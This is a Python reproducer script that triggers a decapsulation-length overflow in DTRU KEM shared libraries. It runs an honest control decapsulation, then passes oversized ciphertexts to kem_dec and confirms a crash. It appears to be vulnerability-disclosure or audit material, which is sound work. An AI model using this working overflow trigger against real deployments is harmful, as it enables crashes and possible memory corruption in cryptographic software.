#!/usr/bin/env python3
"""Bounded whole-KEM reproducer for DTRU's decapsulation-length overflow."""

import ctypes as C
from pathlib import Path
import subprocess
import sys

ROOT = Path(__file__).resolve().parent
PARAMS = {
    "DTRU-Light": (640, 864, 512, 48),
    "DTRU-1024": (1536, 2080, 1280, 80),
}


def worker(label, oversized):
    pk_len, sk_len, ct_len, extension = PARAMS[label]
    lib = C.CDLL(str(ROOT / "lib" / f"lib{label}.so"))
    lib.ngcc_seed.argtypes = [C.c_void_p, C.c_ulonglong]
    lib.kem_keygen.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p]
    lib.kem_enc.argtypes = [C.c_void_p, C.c_ulonglong, C.c_void_p,
                            C.c_void_p, C.c_void_p, C.c_void_p]
    lib.kem_dec.argtypes = [C.c_void_p, C.c_ulonglong, C.c_void_p,
                            C.c_ulonglong, C.c_void_p, C.c_void_p]

    seed = (C.c_ubyte * 48)(*range(48))
    assert lib.ngcc_seed(seed, 48) == 0
    pk, sk = (C.c_ubyte * pk_len)(), (C.c_ubyte * sk_len)()
    pk_out, sk_out = C.c_ulonglong(), C.c_ulonglong()
    assert lib.kem_keygen(pk, C.byref(pk_out), sk, C.byref(sk_out)) == 0
    assert (pk_out.value, sk_out.value) == (pk_len, sk_len)

    ct, ss = (C.c_ubyte * ct_len)(), (C.c_ubyte * 32)()
    ct_out, ss_out = C.c_ulonglong(), C.c_ulonglong()
    assert lib.kem_enc(pk, pk_len, ss, C.byref(ss_out), ct,
                       C.byref(ct_out)) == 0
    assert (ct_out.value, ss_out.value) == (ct_len, 32)

    # The caller really allocates the length it declares. The additional
    # bytes are zero, so any overflow occurs inside the candidate, not here.
    actual_len = ct_len + extension if oversized else ct_len
    supplied = (C.c_ubyte * actual_len)()
    C.memmove(supplied, ct, ct_len)
    got, got_len = (C.c_ubyte * 32)(), C.c_ulonglong()
    rc = lib.kem_dec(sk, sk_len, supplied, actual_len, got,
                     C.byref(got_len))
    if not oversized:
        assert rc == 0 and bytes(got) == bytes(ss) and got_len.value == 32
        print(f"CONTROL {label} honest_length={actual_len} shared_secret_match=yes")
    else:
        print(f"OVERSIZE {label} length={actual_len} returned={rc}")


def main():
    if len(sys.argv) == 4 and sys.argv[1] == "--worker":
        worker(sys.argv[2], sys.argv[3] == "oversized")
        return
    if len(sys.argv) != 1:
        raise SystemExit("usage: python3 kem-14/reproduce_oversize_decapsulation.py")
    for label in PARAMS:
        base = [sys.executable, str(Path(__file__).resolve()), "--worker", label]
        control = subprocess.run(base + ["honest"], capture_output=True, text=True)
        print(control.stdout.strip(), flush=True)
        if control.returncode != 0:
            raise SystemExit(f"{label}: honest control failed: {control.stderr.strip()}")
        attack = subprocess.run(base + ["oversized"], capture_output=True, text=True)
        if attack.returncode not in (-6, -11, 134, 139):
            raise SystemExit(f"{label}: overflow did not abort (rc={attack.returncode})")
        print(f"ATTACK kem-14-1 {label} CONFIRMED "
              f"declared_length={PARAMS[label][2] + PARAMS[label][3]} "
              f"process_exit={attack.returncode}", flush=True)


if __name__ == "__main__":
    main()
